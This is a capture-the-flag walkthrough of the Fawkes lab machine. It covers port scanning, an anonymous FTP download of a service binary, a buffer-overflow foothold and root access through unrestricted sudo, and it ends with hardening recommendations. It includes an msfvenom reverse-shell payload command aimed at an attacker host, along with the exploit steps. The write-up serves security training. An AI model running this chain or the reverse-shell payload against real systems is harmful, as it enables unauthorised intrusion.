# Fawkes CTF – Summary Walkthrough  

A full text-based breakdown of the **Fawkes vulnerable machine**. This box showcases unusual service discovery, exploitation through a classic buffer overflow, and privilege escalation via misconfigured sudo permissions.  

##  Discovery  
- Ran Nmap scan:  
nmap -sV -A <ip>

- Found ports:  
- 80 (HTTP)  
- 21 (FTP – anonymous enabled)  
- 2222 (SSH)  
- 9898 (custom Monkeycom service)  
- 22 (SSH)  

➡️ Insight: Target exposed multiple services, with an unusual custom binary listening on port **9898**.  

##  Enumeration  
- Ran Gobuster on web service:  
gobuster dir -u http://<ip>/
-w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
-x jpg,html,php,bak,zip,log,pdf

- Found `/index.html` but little else of value.  

- Checked FTP with anonymous login → **accessible (read-only)**.  
- Downloaded binary file: `server_hogwarts`.  

✅ Binary appeared to replicate the service running on port 9898.  

##  Foothold (Buffer Overflow)  
- Analyzed binary:  
strings server_hogwarts

→ References to `malloc` and C functions suggested unsafe memory handling.  

- Fuzzed input lengths with Python → crash at ~200 bytes.  
- Used GDB + Metasploit pattern to find **offset to EIP**.  

Steps:  
1. Generate pattern in msfconsole.  
2. Run binary under GDB.  
3. Send pattern to port 9898.  
4. Check EIP with `info registers`.  

- Confirmed EIP overwrite (control gained).  
- Identified bad characters.  

- Used **ropper** to locate `JMP ESP`.  
- Generated reverse shell payload with msfvenom:  
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f py

- Built final exploit (Python): NOP sled + shellcode.  
- Started listener and launched exploit → **reverse shell as user harry**.  

✅ Initial access obtained.  

## Privilege Escalation (harry → root)  
- Checked privileges:  
sudo -l

- Output: **harry had full sudo rights**.  

- Escalated with:  
sudo -i

✅ Root shell gained 🎉  

---

##  Recommendations  
- **Service & Binary Hardening**  
- Disable custom vulnerable service on port 9898.  
- Apply compiler protections (Stack Canaries, ASLR, DEP).  

- **FTP Security**  
- Disable or restrict anonymous login.  

- **Privilege Management**  
- Remove unrestricted sudo for `harry`.  
- Regularly audit `sudoers` file.  

---

📖 **Full walkthrough with screenshots:**  
👉 [View the Medium post here](https://medium.com/@basitolasubomibalogun/harry-potter-series-fawkes-ctf-technical-walkthrough-7f03191fbf0a)
